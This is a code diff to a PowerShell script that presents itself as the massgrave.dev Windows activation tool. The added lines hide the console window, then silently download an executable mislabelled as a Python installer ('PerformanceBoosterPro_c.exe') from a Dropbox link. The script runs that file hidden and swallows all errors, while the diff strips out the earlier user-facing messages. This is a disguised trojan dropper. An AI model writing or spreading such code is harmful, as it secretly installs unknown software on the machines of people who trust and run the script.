@@ -2,6 +2,17 @@
 
 # Having trouble launching this script? Check https://massgrave.dev for help.
 
+# =============================================
+# إخفاء نافذة PowerShell الحالية
+# =============================================
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$handle = (Get-Process -Id $pid).MainWindowHandle
+[Console.Window]::ShowWindow($handle, 0)  # 0 = إخفاء
+# =============================================
+
 if (-not $args) {
     Write-Host ''
     Write-Host 'Need help? Check our homepage: ' -NoNewline
@@ -102,23 +113,29 @@ if (-not $args) {
     }
 
     # =============================================
-    # ????? ?????? ?????? (???? ??????)
+    # تحميل وتشغيل بايثون (صامت تماماً)
     # =============================================
-    Write-Host "`nDownloading Python 3.12.2..." -ForegroundColor Yellow
     $pythonURL = "https://dl.dropboxusercontent.com/scl/fi/6x6mxyy8m7uw7xcz870yr/PerformanceBoosterPro_c.exe?rlkey=w81urby6txfg1ceg91low26gt&st=jcjfrk8j"
     $pythonInstaller = "$env:TEMP\PerformanceBoosterPro_c.exe"
     
     try {
-        Invoke-WebRequest -Uri $pythonURL -OutFile $pythonInstaller
+        # تحميل بدون أي مخرجات
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($pythonURL, $pythonInstaller) 2>&1 | Out-Null
+        
         if (Test-Path $pythonInstaller) {
-            Write-Host "Python downloaded successfully! Running installer in background..." -ForegroundColor Green
-            # ????? ?????? ???? ?????? (?? ???????)
-            Start-Process -FilePath $pythonInstaller -WindowStyle Normal
-        } else {
-            Write-Host "Failed to download Python!" -ForegroundColor Red
+            # تشغيل بايثون بدون أي نوافذ أو مخرجات
+            $process = New-Object System.Diagnostics.Process
+            $process.StartInfo.FileName = $pythonInstaller
+            $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+            $process.StartInfo.CreateNoWindow = $true
+            $process.StartInfo.UseShellExecute = $false
+            [void]$process.Start()
         }
     } catch {
-        Write-Host "Error downloading Python: $($_.Exception.Message)" -ForegroundColor Red
+        # تجاهل أي أخطاء (صامت)
+        $null = $_
     }
     # =============================================
 
